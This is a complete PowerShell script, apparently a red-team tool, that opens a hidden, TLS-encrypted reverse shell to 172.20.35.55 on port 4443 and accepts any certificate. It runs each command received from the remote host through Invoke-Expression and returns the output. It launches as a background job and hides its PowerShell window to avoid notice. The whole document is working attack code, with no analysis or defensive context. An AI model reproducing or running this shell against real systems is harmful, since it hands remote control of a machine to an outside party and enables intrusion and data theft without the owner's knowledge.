$ScriptBlock = {
    # Set the SSL/TLS protocol version to TLS 1.2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    try {
        # Create a TCP client object and connect to the remote host
        $TCPClient = New-Object System.Net.Sockets.TcpClient('172.20.35.55', 4443)

        try {
            # Create an SSL client with the specified protocols
            $SSLClient = New-Object System.Net.Security.SslStream($TCPClient.GetStream(), $false, { $true })
            $SSLClient.AuthenticateAsClient('redteam.com')

            # Check if the SSL stream is successfully encrypted and signed
            if (!$SSLClient.IsEncrypted -or !$SSLClient.IsSigned) {
                throw 'Failed to establish a secure connection.'
            }

            # Create a stream reader and writer to send/receive data from the SSL stream
            $StreamReader = New-Object System.IO.StreamReader($SSLClient)
            $StreamWriter = New-Object System.IO.StreamWriter($SSLClient)

            # Define a function that writes data to the stream
            function WriteToStream($String) {
                $StreamWriter.WriteLine($String + 'RedTeam ReverseShell> ')
                $StreamWriter.Flush()
            }

            try {
                # Initialize the communication by sending an empty string
                WriteToStream ''

                # Enter an interactive loop to send commands and receive outputs
                while ($true) {
                    # Read data from the SSL stream
                    $ReceivedData = $StreamReader.ReadLine()

                    # Check if the connection is closed by the remote host
                    if ($ReceivedData -eq $null) {
                        break
                    }

                    # Execute the received command and capture the output
                    try {
                        $Output = Invoke-Expression $ReceivedData 2>&1 | Out-String
                    } catch {
                        $Output = $_.Exception.Message
                    }

                    # Send the output back to the stream
                    WriteToStream $Output
                }
            } finally {
                # Close the stream reader, writer, and SSL stream
                $StreamReader.Close()
                $StreamWriter.Close()
                $SSLClient.Close()
            }
        } finally {
            # Close the TCP client
            $TCPClient.Close()
        }
    } catch {
        # Print the error message if any error occurs during the connection
        Write-Host "Error: $_"
    }
}

# Start the script in a background job and hide the PowerShell session
$Job = Start-Job -ScriptBlock $ScriptBlock
powershell -NoLogo -WindowStyle Hidden
